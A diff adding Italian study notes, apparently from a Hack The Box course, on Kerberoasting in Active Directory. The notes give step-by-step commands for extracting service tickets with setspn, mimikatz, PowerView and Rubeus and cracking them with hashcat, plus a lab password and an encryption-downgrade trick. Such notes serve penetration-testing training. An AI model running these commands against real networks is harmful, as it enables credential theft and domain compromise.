@@ -840,3 +840,88 @@ RICORDIAMO PRREQUISITO DI BERBEROASTING E' O DOMAIN USER CREDENTIALS(CLEARTEXT P
 ### Proviamo autenticazione col domain controller con la password craccata
 
 `j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!` 
+
+
+# Kerberoasting from Windows metodo semi manuale
+
+Invece di usare tool specifici rubare un kerberos ticket si puo' fare con un processo lungo e manuale
+
+### Enumeratin SPNs con setspn.exe
+`C:\htb> setspn.exe -Q */*`
+
+### Targeting a single user
+```
+PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+### Retrievare tutti i token cn setspn.exe
+`PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`
+
+
+### Estrarre i ticket dalla memoria con mimikatz
+
+`mimikatz # base64 /out:true`
+
+`mimikatz # kerberos::list /export`
+
+
+### Preparare il Blob base64 per craccare 
+`j4k1dibe@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n`
+
+### metterlo in un file .kirbi
+`j4k1dibe@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi`
+
+### Estrarre il ticket con kirbi2john
+`j4k1dibe@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi`
+
+### Modificare il file con hashcat
+`j4k1dibe@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`
+
+
+### Craccare hash
+`j4k1dibe@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`
+
+
+# Metodo automatico
+
+## Con PowerView
+
+### Estrarre i TGS ticket
+```
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Get-DomainUser * -spn | select samaccountname
+```
+### Targettare un utente specifico
+`PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`
+
+### Exportare tutto in CSV
+`PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`
+
+### usare rubeus
+`PS C:\htb> .\Rubeus.exe`
+
+### stats flag
+`PS C:\htb> .\Rubeus.exe kerberoast /stats`
+
+### /nowrap (ci fa vedere hash direttamete e famo copia e incolla ezez)
+
+`PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`
+
+### Nota su encryption
+I tool per il kerberoasting tipicamente richiedono RC4 perche' piu' debole di AES. Spesso quindi riusciamo a rubare ticket RC4(tipo 23) che iniziano per **$krb5tgs$23$**. Pero' potrebbe capicare che riceviamo un altro tipo che usa AES-128(tipo 17) o AES-256(tipo 18) e inizia cosi' **$krb5tgs$18$** 
+
+### Checking supported encryption with PowerView
+
+`PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`
+
+se **msDS-SupportedEncryptionTypes** e' settato a 0 allora significa che non e' specificata un encryption.
+Qui c'e' la tabella dei numeri corrispondenti alle supported encrytion. https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797
+
+
+Comunque prima di craccare su hashcat checka sempre come inizia per la modalita' di hashcat
+
+### /tgtdeleg 
+Questa flag richiede un ticket RC4 anche se RC4 non e' esplicitamente supportato
+
+Questo downgrade forzato non funziona contro Domain Controller Windows server 2019
